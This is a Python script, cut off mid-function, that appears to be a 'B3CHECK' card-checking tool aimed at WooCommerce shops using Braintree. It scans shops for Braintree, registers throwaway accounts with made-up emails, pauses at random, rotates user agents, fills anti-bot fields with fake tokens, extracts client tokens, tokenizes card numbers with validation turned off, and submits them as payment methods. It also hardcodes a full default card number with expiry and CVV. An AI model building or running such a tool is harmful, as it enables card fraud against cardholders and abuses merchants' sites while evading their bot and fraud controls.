import random
import string
import time
import re
import base64
import json
import uuid
import urllib3
from urllib.parse import urljoin, urlparse, urlunparse

import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent

# Playwright for visual debugging
try:
    from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError
    PLAYWRIGHT_AVAILABLE = True
except ImportError as e:
    PLAYWRIGHT_AVAILABLE = False
    print(f"[B3CHECK] Playwright not available - install with: pip install playwright && playwright install chromium")
    print(f"[B3CHECK] Error: {e}")

# Disable SSL warnings to keep terminal clean
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    # Optional: used for fallback login on known sites
    import config  # type: ignore
except Exception:  # pragma: no cover - optional dependency
    config = None


def _debug(msg: str):
    """
    Simple debug printer.
    You can later replace this with logging if needed.
    """
    print(f"[B3CHECK] {msg}")


def _human_pause(min_s: float = 1.0, max_s: float = 3.0):
    """
    Small random sleep to make requests look more human.
    """
    delay = random.uniform(min_s, max_s)
    _debug(f"Sleeping for {delay:.2f}s to simulate human pause.")
    time.sleep(delay)


def generate_random_string(length=10) -> str:
    """Generate random string."""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


def generate_random_email() -> str:
    """Generate random email for registration."""
    return f"{generate_random_string()}@gmail.com"


def generate_realistic_email() -> str:
    """Generate a more realistic email address like Alexagwuans123@gmail.com"""
    # Common first name patterns
    first_names = ["Alex", "John", "Mike", "Sarah", "Emma", "David", "Chris", "Lisa", "Tom", "Anna"]
    # Common last name patterns  
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Wilson", "Moore"]
    
    # Random first and last name
    first = random.choice(first_names)
    last = random.choice(last_names)
    
    # Add 3 random numbers
    numbers = ''.join(random.choices(string.digits, k=3))
    
    # Combine: FirstLast123@gmail.com
    return f"{first}{last}{numbers}@gmail.com"


def generate_random_username() -> str:
    """Generate random username for registration."""
    return f"user_{generate_random_string(8)}"


def generate_random_password() -> str:
    """Generate random password for registration."""
    return generate_random_string(12)


def detect_country_from_domain(url: str) -> str:
    """
    Detect country code from domain TLD (Top-Level Domain).
    Returns 2-letter country code (e.g., 'PH', 'US', 'GB').
    """
    try:
        from urllib.parse import urlparse
        
        # Parse URL to get domain
        parsed = urlparse(url if "://" in url else "http://" + url)
        domain = parsed.netloc or url.split('/')[0]
        
        # Extract TLD (last part after last dot)
        parts = domain.split('.')
        if len(parts) >= 2:
            tld = parts[-1].lower()
            
            # Map common TLDs to country codes
            tld_to_country = {
                # Country code TLDs
                'ph': 'PH',  # Philippines
                'uk': 'GB',  # United Kingdom (ISO code is GB)
                'jp': 'JP',  # Japan
                'au': 'AU',  # Australia
                'ca': 'CA',  # Canada
                'de': 'DE',  # Germany
                'fr': 'FR',  # France
                'it': 'IT',  # Italy
                'es': 'ES',  # Spain
                'nl': 'NL',  # Netherlands
                'br': 'BR',  # Brazil
                'mx': 'MX',  # Mexico
                'in': 'IN',  # India
                'cn': 'CN',  # China
                'kr': 'KR',  # South Korea
                'sg': 'SG',  # Singapore
                'my': 'MY',  # Malaysia
                'th': 'TH',  # Thailand
                'id': 'ID',  # Indonesia
                'vn': 'VN',  # Vietnam
                'tw': 'TW',  # Taiwan
                'hk': 'HK',  # Hong Kong
                'nz': 'NZ',  # New Zealand
                'za': 'ZA',  # South Africa
                'ae': 'AE',  # UAE
                'sa': 'SA',  # Saudi Arabia
                'tr': 'TR',  # Turkey
                'pl': 'PL',  # Poland
                'ru': 'RU',  # Russia
                'se': 'SE',  # Sweden
                'no': 'NO',  # Norway
                'dk': 'DK',  # Denmark
                'fi': 'FI',  # Finland
                'ie': 'IE',  # Ireland
                'be': 'BE',  # Belgium
                'ch': 'CH',  # Switzerland
                'at': 'AT',  # Austria
                'pt': 'PT',  # Portugal
                'gr': 'GR',  # Greece
                'co': 'CO',  # Colombia
                'ar': 'AR',  # Argentina
                'cl': 'CL',  # Chile
                'pe': 'PE',  # Peru
                'pk': 'PK',  # Pakistan
                'bd': 'BD',  # Bangladesh
                'eg': 'EG',  # Egypt
                'ng': 'NG',  # Nigeria
                'ke': 'KE',  # Kenya
            }
            
            # Check if TLD maps to a country
            if tld in tld_to_country:
                return tld_to_country[tld]
            
            # Check for 2-letter TLD that might be a country code
            if len(tld) == 2 and tld.isalpha():
                # Return uppercase if it looks like a country code
                return tld.upper()
        
        # Default: check if domain contains country indicators
        domain_lower = domain.lower()
        if '.com.ph' in domain_lower or '.ph' in domain_lower:
            return 'PH'
        elif '.co.uk' in domain_lower:
            return 'GB'
        elif '.com.au' in domain_lower:
            return 'AU'
        elif '.co.jp' in domain_lower:
            return 'JP'
        
        # Default to US for .com, .org, .net, etc.
        return 'US'
        
    except Exception as e:
        _debug(f"Error detecting country from domain: {e}")
        return 'US'  # Default fallback


def extract_base_url(raw_url: str) -> str:
    """
    Extract base URL (scheme + netloc) from any URL/string.
    Examples:
        https://site.com/path -> https://site.com
        site.com/something    -> http://site.com  (default to http if no scheme)
    """
    raw_url = raw_url.strip()
    if not raw_url:
        return ""

    # Ensure scheme so urlparse works correctly
    if "://" not in raw_url:
        raw_url = "http://" + raw_url

    parsed = urlparse(raw_url)
    if not parsed.netloc:
        return ""
    base = f"{parsed.scheme}://{parsed.netloc}"
    _debug(f"Extracted base URL: {base} from input: {raw_url}")
    return base


def get_base_url(user_url: str) -> str:
    """
    Cleans any messy line (e.g., 'Live > www.site.com text') and ensures https:// is added.
    Copied from stripechecker.py for consistency.
    """
    # Strip and lower the line
    user_url = user_url.strip().lower()

    # Extract the first valid domain-like part using regex
    match = re.search(r'([a-z0-9-]+\.[a-z]{2,}(?:\.[a-z]{2,})?)', user_url)
    if not match:
        return ""  # skip invalid line

    domain = match.group(1)

    # Automatically prepend https:// if not already present
    if not domain.startswith(("http://", "https://")):
        domain = "https://" + domain

    # Parse and clean
    parsed = urlparse(domain)
    return urlunparse((parsed.scheme, parsed.netloc, '', '', '', ''))


def _find_registration_form(soup: BeautifulSoup):
    """
    Try to locate a registration form element in the /my-account page.
    Returns the form tag or None.
    """
    # Typical WooCommerce registration form patterns
    form = soup.find("form", id="register") or soup.find("form", attrs={"class": "register"})
    if form:
        return form

    # Fallback: any form that looks like a registration form.
    # We accept either:
    #  - email + password inputs, OR
    #  - email input + submit button whose name/value contains "register".
    for f in soup.find_all("form"):
        inputs = f.find_all("input")
        has_email = False
        has_password = False
        has_register_submit = False
        for inp in inputs:
            name = (inp.get("name") or "").lower()
            itype = (inp.get("type") or "").lower()
            value = (inp.get("value") or "").lower()
            if "email" in name or itype == "email":
                has_email = True
            if "pass" in name or itype == "password":
                has_password = True
            if itype == "submit" and ("register" in name or "register" in value):
                has_register_submit = True
        if (has_email and has_password) or (has_email and has_register_submit):
            return f


def _maybe_click_register_button_first(session: requests.Session, account_url: str, soup: BeautifulSoup) -> BeautifulSoup:
    """
    Some sites show only a big 'REGISTER' button first and reveal the email input
    only after submitting that button (often same URL).

    Here we try to detect a form that only has a register submit button but no email
    field yet. If found, we POST that form once and return the new soup. If anything
    fails, we just return the original soup.
    """
    try:
        for form in soup.find_all("form"):
            inputs = form.find_all("input")
            has_email = False
            register_submit_name = None
            register_submit_value = None

            for inp in inputs:
                name = (inp.get("name") or "").lower()
                itype = (inp.get("type") or "").lower()
                value = (inp.get("value") or "").lower()

                if "email" in name or itype == "email":
                    has_email = True
                if itype == "submit" and ("register" in name or "register" in value):
                    register_submit_name = inp.get("name")
                    register_submit_value = inp.get("value") or "Register"

            # If this form only has a register button but no email yet, click it.
            if register_submit_name and not has_email:
                _debug("Found pre-register form (button only). Submitting it to reveal email field...")
                data: dict[str, str] = {}
                for inp in inputs:
                    name = inp.get("name")
                    if not name:
                        continue
                    if name == register_submit_name:
                        data[name] = register_submit_value
                    else:
                        data[name] = inp.get("value", "") or ""

                action = form.get("action")
                url = urljoin(account_url, action) if action else account_url
                _debug(f"Pre-register POST to {url} with button {register_submit_name}={register_submit_value}")
                resp = session.post(url, data=data, timeout=15, verify=False, allow_redirects=True)
                resp.raise_for_status()
                return BeautifulSoup(resp.text, "html.parser")
    except Exception as e:
        _debug(f"Pre-register click failed or not needed: {e}")

    return soup

    return None


def _find_login_form(soup: BeautifulSoup):
    """Locate a login form on /my-account page."""
    form = soup.find("form", id="login") or soup.find("form", attrs={"class": "login"})
    if form:
        return form

    for f in soup.find_all("form"):
        inputs = f.find_all("input")
        has_user = False
        has_password = False
        for inp in inputs:
            name = (inp.get("name") or "").lower()
            itype = (inp.get("type") or "").lower()
            if "user" in name or "login" in name or "email" in name:
                has_user = True
            if "pass" in name or itype == "password":
                has_password = True
        if has_user and has_password:
            return f
    return None


def _is_logged_in_account_page(soup: BeautifulSoup) -> bool:
    """
    Best-effort check if /my-account page looks logged-in.
    We look for a logout link or dashboard content and absence of registration form.
    """
    # WooCommerce logout menu item
    if soup.find("li", class_="woocommerce-MyAccount-navigation-link--customer-logout"):
        return True
    # Any link with "logout" text
    for a in soup.find_all("a"):
        text = (a.get_text() or "").strip().lower()
        if "logout" in text or "log out" in text:
            return True
    # If we see account dashboard but no register form, assume logged-in
    if soup.find(class_="woocommerce-MyAccount-content") and not _find_registration_form(soup):
        return True
    return False


def detect_braintree_public(base_url: str, session: requests.Session = None) -> dict:
    """
    Detect if a site uses Braintree payment processing by checking public pages
    (no registration/login required).
    
    Checks multiple public pages:
    - Checkout page (/checkout/)
    - Cart page (/cart/)
    - Homepage
    - JavaScript files (braintree.js, etc.)
    
    Returns dict with:
    {
        "has_braintree": bool,
        "braintree_type": str,  # 'braintree_cc', 'braintree_credit_card', 'braintree_paypal', or 'none'
        "detected_on": str,  # Which page/URL detected it
        "details": str
    }
    """
    sess = session or requests.Session()
    sess.headers["User-Agent"] = UserAgent().random
    
    base_url = extract_base_url(base_url) or base_url
    if not base_url:
        return {
            "has_braintree": False,
            "braintree_type": "none",
            "detected_on": None,
            "details": "Invalid base URL"
        }
    
    # List of public pages to check (in order of likelihood to have payment info)
    public_urls = [
        ("checkout", urljoin(base_url.rstrip("/") + "/", "checkout/")),
        ("cart", urljoin(base_url.rstrip("/") + "/", "cart/")),
        ("homepage", base_url.rstrip("/") + "/"),
        ("shop", urljoin(base_url.rstrip("/") + "/", "shop/")),
    ]
    
    _debug(f"Checking public pages for Braintree on: {base_url}")
    
    for page_name, url in public_urls:
        try:
            _debug(f"Checking {page_name} page: {url}")
            resp = sess.get(url, timeout=10, verify=False, allow_redirects=True)
            
            if resp.status_code == 200:
                # Check HTML content
                braintree_type = detect_braintree_type(resp.text)
                if braintree_type != 'none':
                    _debug(f"✅ Braintree detected on {page_name} page: {braintree_type}")
                    return {
                        "has_braintree": True,
                        "braintree_type": braintree_type,
                        "detected_on": page_name,
                        "details": f"Braintree ({braintree_type}) detected on {page_name} page"
                    }
                
                # Also check for Braintree JavaScript references
                if 'braintree' in resp.text.lower():
                    # Check for specific JS patterns
                    js_patterns = [
                        r'braintree[_-]?client[_-]?token',
                        r'braintree[_-]?\.js',
                        r'braintreegateway\.com',
                        r'payments\.braintree[_-]?api\.com',
                    ]
                    for pattern in js_patterns:
                        if re.search(pattern, resp.text, re.IGNORECASE):
                            _debug(f"✅ Braintree JavaScript detected on {page_name} page")
                            return {
                                "has_braintree": True,
                                "braintree_type": "braintree_cc",  # Default, can't determine exact type from JS
                                "detected_on": page_name,
                                "details": f"Braintree JavaScript detected on {page_name} page"
                            }
        except Exception as e:
            _debug(f"Error checking {page_name} page: {e}")
            continue
    
    # Check for Braintree in common JavaScript file locations
    js_urls = [
        urljoin(base_url.rstrip("/") + "/", "wp-content/plugins/woocommerce-gateway-braintree/"),
        urljoin(base_url.rstrip("/") + "/", "assets/js/braintree.js"),
    ]
    
    for js_url in js_urls:
        try:
            resp = sess.get(js_url, timeout=5, verify=False, allow_redirects=True)
            if resp.status_code == 200 and 'braintree' in resp.text.lower():
                _debug(f"✅ Braintree JavaScript file found: {js_url}")
                return {
                    "has_braintree": True,
                    "braintree_type": "braintree_cc",
                    "detected_on": "javascript",
                    "details": f"Braintree JavaScript file found"
                }
        except Exception:
            continue
    
    _debug("No Braintree detected on public pages")
    return {
        "has_braintree": False,
        "braintree_type": "none",
        "detected_on": None,
        "details": "No Braintree detected on public pages (may require registration to see payment methods)"
    }


def detect_braintree_type(html_content: str) -> str:
    """
    Detect what type of Braintree integration is used.
    Returns: 'braintree_cc', 'braintree_credit_card', 'braintree_paypal', or 'none'
    More comprehensive detection using multiple patterns.
    """
    html_lower = html_content.lower()
    soup = BeautifulSoup(html_content, 'html.parser')
    
    # Priority 1: Check for braintree_credit_card (format2) - most specific
    credit_card_patterns = [
        'value="braintree_credit_card"',
        'value=\'braintree_credit_card\'',
        'wc-braintree-credit-card',
        'wc_braintree_credit_card',
        'payment_method_braintree_credit_card',
        'braintree_credit_card_payment_nonce',
        'wc-braintree-credit-card-card-type',
    ]
    for pattern in credit_card_patterns:
        if pattern in html_lower:
            _debug(f"Found braintree_credit_card via pattern: {pattern}")
            return 'braintree_credit_card'
    
    # Check in form inputs/selects
    form_inputs = soup.find_all(['input', 'select'], {'name': re.compile(r'braintree.*credit.*card|wc.*braintree.*credit', re.I)})
    if form_inputs:
        _debug("Found braintree_credit_card via form input")
        return 'braintree_credit_card'
    
    # Priority 2: Check for braintree_paypal
    paypal_patterns = [
        'value="braintree_paypal"',
        'value=\'braintree_paypal\'',
        'wc-braintree-paypal',
        'wc_braintree_paypal',
        'payment_method_braintree_paypal',
        'wc_braintree_paypal_payment_nonce',
        'braintree_paypal_payment_nonce',
    ]
    for pattern in paypal_patterns:
        if pattern in html_lower:
            _debug(f"Found braintree_paypal via pattern: {pattern}")
            return 'braintree_paypal'
    
    # Check in form inputs/selects for PayPal
    paypal_inputs = soup.find_all(['input', 'select'], {'name': re.compile(r'braintree.*paypal|wc.*braintree.*paypal', re.I)})
    if paypal_inputs:
        _debug("Found braintree_paypal via form input")
        return 'braintree_paypal'
    
    # Priority 3: Check for braintree_cc (format1) - most common
    cc_patterns = [
        'value="braintree_cc"',
        'value=\'braintree_cc\'',
        'payment_method_braintree_cc',
        'braintree_cc_nonce_key',
        'braintree_cc_device_data',
        'braintree_cc_config_data',
    ]
    for pattern in cc_patterns:
        if pattern in html_lower:
            _debug(f"Found braintree_cc via pattern: {pattern}")
            return 'braintree_cc'
    
    # Check in form inputs/selects for braintree_cc
    cc_inputs = soup.find_all(['input', 'select'], {'name': re.compile(r'braintree_cc|payment_method.*braintree', re.I)})
    if cc_inputs:
        _debug("Found braintree_cc via form input")
        return 'braintree_cc'
    
    # Check in radio buttons or payment method options
    payment_methods = soup.find_all(['input', 'li'], {'class': re.compile(r'payment.*method|braintree', re.I)})
    for pm in payment_methods:
        pm_text = pm.get_text().lower() if hasattr(pm, 'get_text') else str(pm).lower()
        if 'braintree_credit_card' in pm_text or 'wc-braintree-credit-card' in pm_text:
            _debug("Found braintree_credit_card via payment method element")
            return 'braintree_credit_card'
        if 'braintree_paypal' in pm_text or 'wc-braintree-paypal' in pm_text:
            _debug("Found braintree_paypal via payment method element")
            return 'braintree_paypal'
        if 'braintree_cc' in pm_text:
            _debug("Found braintree_cc via payment method element")
            return 'braintree_cc'
    
    _debug("No Braintree type detected")
    return 'none'


def detect_site_payment_format(html_content: str) -> str:
    """
    Enhanced format detection with multiple fallback checks.
    Handles various site formats for add payment method page.
    Based on b3.py detect_site_payment_format.
    Returns: 'format1', 'format2', or 'format3'
    """
    soup = BeautifulSoup(html_content, 'html.parser')
    html_lower = html_content.lower()
    
    # Explicit quick check: if the page clearly has braintree_credit_card,
    # prefer format2 even if other markers (like ct_bot_detector) exist.
    if 'value="braintree_credit_card"' in html_lower or 'wc-braintree-credit-card' in html_lower:
        return 'format2'
    
    # Primary format detection patterns
    formats = {
        'braintree_cc': 'format1',
        'braintree_credit_card': 'format2',
        'wc-braintree-credit-card': 'format2',
        'braintree_cc_config_data': 'format3',
        'ct_bot_detector_event_token': 'format4',
        'apbct_visible_fields': 'format3',
        'ct_bot_detector': 'format3'
    }
    
    detected_formats = []
    for key, format_type in formats.items():
        if key in html_content or key in html_lower:
            detected_formats.append(format_type)
    
    # Check for format3 indicators (highest priority)
    if 'format3' in detected_formats or 'format4' in detected_formats:
        return 'format3'
    
    # Check for format2 indicators
    if 'format2' in detected_formats:
        return 'format2'
    
    # Additional checks for format2
    format2_patterns = [
        r'wc[_-]?braintree[_-]?credit[_-]?card',
        r'braintree[_-]?credit[_-]?card',
        r'payment[_-]?method[=:]\s*["\']?braintree[_-]?credit[_-]?card',
    ]
    for pattern in format2_patterns:
        if re.search(pattern, html_content, re.IGNORECASE):
            return 'format2'
    
    # Check for format3 additional patterns
    format3_patterns = [
        r'ct[_-]?bot[_-]?detector',
        r'apbct[_-]?visible[_-]?fields',
        r'braintree[_-]?cc[_-]?config[_-]?data',
    ]
    for pattern in format3_patterns:
        if re.search(pattern, html_content, re.IGNORECASE):
            return 'format3'
    
    # Check form structure - look for specific input names
    form_inputs = soup.find_all(['input', 'select'], {'name': re.compile(r'braintree|payment', re.I)})
    for inp in form_inputs:
        name = inp.get('name', '').lower()
        if 'wc-braintree-credit-card' in name or 'braintree_credit_card' in name:
            return 'format2'
        if 'braintree_cc_config' in name or 'ct_bot' in name:
            return 'format3'
    
    # Default to format1 (most common)
    return 'format1'


def build_device_data(sess=None, corr=None, merchant_id=None):
    """Build device data for Braintree. Returns (simple_format, full_format)."""
    if not sess:
        sess = generate_random_string(32)
    if not corr:
        corr = str(uuid.uuid4())
    
    simple_format = f'{{"correlation_id":"{corr}"}}'
    full_format = f'{{"device_session_id":"{sess}","fraud_merchant_id":{merchant_id or "null"},"correlation_id":"{corr}"}}'
    
    return simple_format, full_format


def detect_payment_form_fields(html_content: str) -> dict:
    """Detect all payment-related form fields that might be required."""
    soup = BeautifulSoup(html_content, 'html.parser')
    detected_fields = {}
    
    # Find all form inputs related to braintree/payment
    payment_inputs = soup.find_all(['input', 'select', 'textarea'], {
        'name': re.compile(r'braintree|payment|card|wc[_-]?braintree', re.I)
    })
    
    for inp in payment_inputs:
        field_name = inp.get('name')
        if field_name:
            field_type = inp.get('type', '').lower()
            # Skip if it's a submit button or file input
            if field_type in ['submit', 'button', 'file', 'image']:
                continue
            
            # Get default value
            default_value = inp.get('value', '')
            if not default_value and inp.name == 'select':
                # For select, get first option value
                first_option = inp.find('option', value=True)
                if first_option:
                    default_value = first_option.get('value', '')
            
            # For hidden fields or fields without value, use empty string
            if field_type == 'hidden' or not default_value:
                default_value = ''
            
            detected_fields[field_name] = default_value
    
    return detected_fields


def build_payment_data_format1(tok: str, noncec: str, device_data_simple: str, billing_fields: dict = None) -> dict:
    """Build payment data for format1 (braintree_cc)."""
    data = {
        'payment_method': 'braintree_cc',
        'braintree_cc_nonce_key': tok,
        'braintree_cc_device_data': device_data_simple,
        'woocommerce-add-payment-method-nonce': noncec,
        '_wp_http_referer': '/my-account/add-payment-method/',
        'woocommerce_add_payment_method': '1'
    }
    # Add detected billing fields if any
    if billing_fields:
        data.update(billing_fields)
    return data


def build_payment_data_format2(tok: str, noncec: str, device_data_simple: str, billing_fields: dict = None, html_content: str = None) -> list:
    """Build payment data for format2 (braintree_credit_card). Returns list of tuples."""
    data = [
        ('payment_method', 'braintree_credit_card'),
        ('wc-braintree-credit-card-card-type', 'visa'),
        ('wc-braintree-credit-card-3d-secure-enabled', ''),
        ('wc-braintree-credit-card-3d-secure-verified', ''),
        ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
        ('wc_braintree_credit_card_payment_nonce', tok),  # Main token field
        ('wc_braintree_device_data', device_data_simple),
        ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
        # Alternative field names that some sites might require
        ('wc-braintree-credit-card-payment-nonce', tok),  # Alternative format
        ('braintree_credit_card_payment_nonce', tok),  # Another alternative
        ('wc_braintree_payment_nonce', tok),  # Yet another alternative
        ('wc_braintree_paypal_payment_nonce', ''),
        ('wc-braintree-paypal-context', 'shortcode'),
        ('wc_braintree_paypal_amount', '0.00'),
        ('wc_braintree_paypal_currency', 'GBP'),
        ('wc_braintree_paypal_locale', 'en_gb'),
        ('wc-braintree-paypal-tokenize-payment-method', 'true'),
        ('woocommerce-add-payment-method-nonce', noncec),
        ('_wp_http_referer', '/my-account/add-payment-method/'),
        ('woocommerce_add_payment_method', '1'),
    ]
    
    # Detect additional payment form fields from HTML if provided
    if html_content:
        form_fields = detect_payment_form_fields(html_content)
        for field_name, field_value in form_fields.items():
            # Only add if not already in data (avoid duplicates)
            if not any(field_name == item[0] for item in data):
                data.append((field_name, field_value))
                _debug(f"Added detected payment field: {field_name} = {field_value}")
    
    # Add detected billing fields if any
    if billing_fields:
        for field_name, field_value in billing_fields.items():
            # Only add if not already in data
            if not any(field_name == item[0] for item in data):
                data.append((field_name, field_value))
    
    return data


def extract_config_data(html_content: str) -> str | None:
    """Extract braintree_cc_config_data from HTML."""
    patterns = [
        r'braintree_cc_config_data[\'\"]\s*:\s*[\'\"](.*?)[\'\"]',
        r'"braintree_cc_config_data"\s*:\s*"(.*?)"',
        r'var wc_braintree_config\s*=\s*({.*?});',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, html_content, re.DOTALL)
        if match:
            return match.group(1)
    
    return None


def build_payment_data_format3(tok: str, noncec: str, device_data_full: str, config_data: str = None, billing_fields: dict = None) -> dict:
    """Build payment data for format3 (with bot detector)."""
    base_data = {
        'payment_method': 'braintree_cc',
        'braintree_cc_nonce_key': tok,
        'braintree_cc_device_data': device_data_full,
        'braintree_cc_3ds_nonce_key': '',
        'billing_address_1': '123 Allen Street',  # Default fallback
        'woocommerce-add-payment-method-nonce': noncec,
        '_wp_http_referer': '/my-account/add-payment-method/',
        'woocommerce_add_payment_method': '1',
    }
    
    # Add detected billing fields if any (will override defaults)
    if billing_fields:
        base_data.update(billing_fields)
    
    if config_data:
        base_data['braintree_cc_config_data'] = config_data
    
    base_data.update({
        'ct_bot_detector_event_token': generate_random_string(64),
        'apbct_visible_fields': 'eyIwIjp7InZpc2libGVfZmllbGRzIjoiYmlsbGluZ19hZGRyZXNzXzEiLCJ2aXNpYmxlX2ZpZWxkX2NvdW50IjoxLCJpbnZpc2libGVfZmllbGRzIjoiYnJhaW50cmVlX2NjX25vbmNlX2tleSByYWludHJlZV9jY19kZXZpY2VfZGF0YSByYWludHJlZV9jY18zZHNfbm9uY2Vfa2V5IGJyYWludHJlZV9jY19jb25maWdfZGF0YSB3b29jb21tZXJjZS1hZGQtcGF5bWVudC1tZXRob2Qtbm9uY2UgX3dwX2h0dHBfcmVmZXJlciB3b29jb21tZXJjZV9hZGRfcGF5bWVudF9tZXRob2QgY3RfYm90X2RldGVjdG9yX3ZlcndyaXRlX2ZpZWxkIiwidGl0bGVfYnVpbGRfaWQiOiIxMjMhQWxsZW4gU3RyZWV0IiwidGl0bGVfYnVpbGRfc3RhdHVzIjoiMjAyMy0wMS0wMVQwMDowMDowMFoiLCJ0aXRsZV9idWlsZF9pZCI6IjEyMzBhbGxlbnN0cmVldCJ9fQ==',
        'ct_no_cookie_hidden_field': '',
    })
    
    return base_data


def parseX(data, start, end):
    """Extract text between start and end markers."""
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return "None"


def get_client_token(session: requests.Session, base_url: str, html_content: str, headers: dict = None) -> str | None:
    """
    Extract client token from HTML or fetch via AJAX.
    Returns authorizationFingerprint or None.
    Based on b3.py get_client_token_multiple_methods.
    """
    # Method 1: Try parseX function (like b3.py)
    token = parseX(html_content, 'var wc_braintree_client_token = ["', '"];')
    if token != "None":
        try:
            decoded_token = json.loads(base64.b64decode(token))['authorizationFingerprint']
            _debug(f"Got client token via direct extraction (parseX): {decoded_token[:50]}...")
            return decoded_token
        except Exception as e:
            _debug(f"parseX method failed: {e}")
    
    # Method 2: Try regex patterns
    patterns = [
        r'wc_braintree_client_token\s*=\s*\["([^"]+)"\]',
        r'"client_token"\s*:\s*"([^"]+)"',
        r'clientToken\s*:\s*"([^"]+)"',
        r'client_token[\'\"]\s*:\s*[\'\"](.*?)[\'\"]',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, html_content)
        if match:
            try:
                decoded_token = json.loads(base64.b64decode(match.group(1)))['authorizationFingerprint']
                _debug(f"Got client token via pattern matching: {decoded_token[:50]}...")
                return decoded_token
            except Exception as e:
                _debug(f"Pattern {pattern} failed: {e}")
                continue
    
    # Method 3: Try AJAX with nonce
    client_token_nonce = re.search(r'"client_token_nonce"\s*:\s*"([^"]+)"', html_content)
    if client_token_nonce:
        nonce = client_token_nonce.group(1)
        _debug(f"Trying admin AJAX with nonce: {nonce[:20]}...")
        
        ajax_headers = (headers.copy() if headers else {})
        ajax_headers.update({
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
        })
        
        # Primary attempt: credit-card action
        data = {
            'action': 'wc_braintree_credit_card_get_client_token',
            'nonce': nonce,
        }
        
        try:
            ajax_url = f"{base_url.rstrip('/')}/wp-admin/admin-ajax.php"
            resp = session.post(ajax_url, data=data, headers=ajax_headers, timeout=15, verify=False)
            if resp.status_code == 200:
                response_data = resp.json()
                if isinstance(response_data, dict) and response_data.get('success'):
                    # Handle URL-encoded data (like b3_creditcard.py)
                    data_field = response_data.get('data')
                    if isinstance(data_field, str):
                        try:
                            # Try URL decoding first (like b3_creditcard.py)
                            decoded_bytes = requests.utils.unquote_to_bytes(data_field)
                            decoded_json = json.loads(decoded_bytes.decode("utf-8"))
                        except:
                            # Fallback to direct base64 decode
                            decoded_json = json.loads(base64.b64decode(data_field))
                        decoded_token = decoded_json.get('authorizationFingerprint')
                        if decoded_token:
                            _debug(f"Got client token via AJAX (nonce action): {decoded_token[:50]}...")
                            return decoded_token
                else:
                    _debug(f"AJAX nonce call did not return success JSON. Raw response: {str(response_data)[:300]}")
        except Exception as e:
            _debug(f"AJAX request failed: {e}")
        
        # Fallback actions - try several common endpoints
        ajax_actions = [
            'wc_braintree_paypal_get_client_token',
            'wc_braintree_credit_card_get_client_token',
            'wc_braintree_cc_get_client_token',
            'wc_braintree_get_client_token',
            'braintree_get_client_token',
            'get_braintree_token',
        ]
        
        for action in ajax_actions:
            try:
                data = {'action': action}
                if 'get_client_token' in action:
                    data['nonce'] = nonce
                
                resp = session.post(ajax_url, data=data, headers=ajax_headers, timeout=15, verify=False)
                if resp.status_code == 200:
                    response_data = resp.json()
                    if isinstance(response_data, dict) and response_data.get('success') and 'data' in response_data:
                        data_field = response_data['data']
                        try:
                            # Try URL decoding first
                            decoded_bytes = requests.utils.unquote_to_bytes(data_field)
                            decoded_json = json.loads(decoded_bytes.decode("utf-8"))
                        except:
                            # Fallback to direct base64 decode
                            decoded_json = json.loads(base64.b64decode(data_field))
                        decoded_token = decoded_json.get('authorizationFingerprint')
                        if decoded_token:
                            _debug(f"Got client token via fallback action '{action}': {decoded_token[:50]}...")
                            return decoded_token
                    else:
                        _debug(f"AJAX fallback action '{action}' returned non-success JSON: {str(response_data)[:300]}")
            except Exception as e:
                _debug(f"Fallback action '{action}' failed: {e}")
                continue
    
    _debug("All client token extraction methods failed")
    return None


def tokenize_card_braintree(session: requests.Session, bearer_token: str, card_number: str, 
                            exp_month: str, exp_year: str, cvv: str, postal_code: str = "12345", 
                            address: str = "123 Main St") -> str | None:
    """
    Tokenize card via Braintree GraphQL API.
    Returns payment nonce or None.
    """
    url = "https://payments.braintree-api.com/graphql"
    headers = {
        "Authorization": f"Bearer {bearer_token}",
        "Braintree-Version": "2018-05-10",
        "Content-Type": "application/json",
        "Origin": "https://assets.braintreegateway.com",
        "Referer": "https://assets.braintreegateway.com/",
        "User-Agent": UserAgent().random,
    }
    
    payload = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": str(uuid.uuid4()),
        },
        "query": """
            mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
                tokenizeCreditCard(input: $input) {
                    token
                }
            }
        """,
        "variables": {
            "input": {
                "creditCard": {
                    "number": card_number,
                    "expirationMonth": exp_month,
                    "expirationYear": exp_year,
                    "cvv": cvv,
                    "billingAddress": {
                        "postalCode": postal_code,
                        "streetAddress": address,
                    },
                },
                "options": {"validate": False},
            }
        },
        "operationName": "TokenizeCreditCard",
    }
    
    try:
        resp = session.post(url, headers=headers, json=payload, timeout=15, verify=False)
        resp.raise_for_status()
        result = resp.json()
        if 'data' in result and 'tokenizeCreditCard' in result['data']:
            return result['data']['tokenizeCreditCard'].get('token')
    except Exception as e:
        _debug(f"Tokenization failed: {e}")
    
    return None


def add_payment_method_braintree(session: requests.Session, base_url: str, card_number: str,
                                  exp_month: str, exp_year: str, cvv: str) -> dict:
    """
    Add payment method after registration.
    Returns dict with 'success', 'is_good_site', 'message', 'braintree_type'
    """
    DEFAULT_CARD = "4895040596803748|01|2031|105"
    
    # Parse card if provided, otherwise use default
    if card_number:
        card_parts = f"{card_number}|{exp_month}|{exp_year}|{cvv}".split("|")
    else:
        card_parts = DEFAULT_CARD.split("|")
    
    if len(card_parts) != 4:
        return {"success": False, "is_good_site": False, "message": "Invalid card format", "braintree_type": None}
    
    card_num, exp_m, exp_y, card_cvv = card_parts
    
    payment_url = urljoin(base_url.rstrip("/") + "/", "my-account/add-payment-method/")
    _debug(f"Navigating to payment method page: {payment_url}")
    
    try:
        headers = {
            "User-Agent": UserAgent().random,
            "Referer": payment_url,
        }
        resp = session.get(payment_url, headers=headers, timeout=15, verify=False, allow_redirects=True)
        resp.raise_for_status()
        html = resp.text
        final_url = resp.url
        
        # Check if we got redirected to login (session might be lost)
